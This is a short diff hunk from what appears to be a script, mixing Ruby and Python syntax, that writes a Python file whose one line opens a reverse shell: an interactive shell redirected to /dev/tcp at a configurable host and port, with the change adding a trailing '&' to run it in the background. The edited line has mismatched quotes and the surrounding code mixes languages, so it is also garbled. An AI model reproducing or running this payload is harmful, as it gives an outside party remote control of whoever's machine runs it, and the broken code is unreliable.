@@ -47,7 +47,7 @@ w = os.environ['OLDPWD']
 os.chdir(w)
 open(file, 'w') { |f|
     f.puts "import os"
-    f.puts "os.system('#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1')"
+    f.puts "os.system(\'#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1 &\")"
 }
 g = os.environ['HOME']
 os.chdir(g + "/thoron")
